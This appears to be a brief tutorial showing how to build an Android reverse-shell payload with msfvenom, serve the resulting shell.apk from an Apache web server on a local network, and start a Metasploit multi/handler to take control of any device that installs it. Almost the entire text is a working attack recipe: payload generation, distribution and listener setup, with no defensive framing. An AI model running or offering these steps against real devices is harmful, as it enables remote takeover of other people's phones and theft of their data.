
  Creating a payload for android:
  --------------------------
  
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 R> shell.apk
    
  Starting apache2 server:
  --------------------------
    service apache2 start
    
  Now i can use my computer as a server . 
  
    cp shell.apk /var/www/html/
    
   Now I can download shell.apk by accessing apache server from any device connected with same network . just type http://192.168.0.104 .
   
    
    
  Starting metasploit:
  ---------------------------
  >> use exploit/multi/handler<br>
  >> set payload android/meterpreter/reverse_tcp<br>
  >> show options<br>
  >> set LHOST 192.168.0.104<br>
  >> set LPORT 4444<br>
  >> exploit<br>
  
    
    
 
